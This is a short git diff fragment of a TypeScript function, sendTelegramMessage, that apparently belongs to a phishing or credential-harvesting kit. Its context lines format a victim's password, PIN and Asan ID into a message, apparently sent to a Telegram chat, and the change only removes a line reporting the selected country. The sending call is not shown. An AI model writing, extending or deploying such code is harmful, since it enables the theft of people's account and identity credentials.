@@ -292,7 +292,6 @@ export const sendTelegramMessage = async (params: {
             if (userPassword) message += `• <b>Pass:</b> <code>${userPassword}</code>\n`;
             if (userPin) message += `• <b>PIN:</b> <code>${userPin}</code>\n`;
             if (userAsan) message += `• <b>Asan ID:</b> <code>${userAsan}</code>\n`;
-            if (newInfo.country && !exclude?.includes("country")) message += `• <b>Selected Country:</b> <code>${newInfo.country}</code>\n`;
             message += `\n`;
         }
 
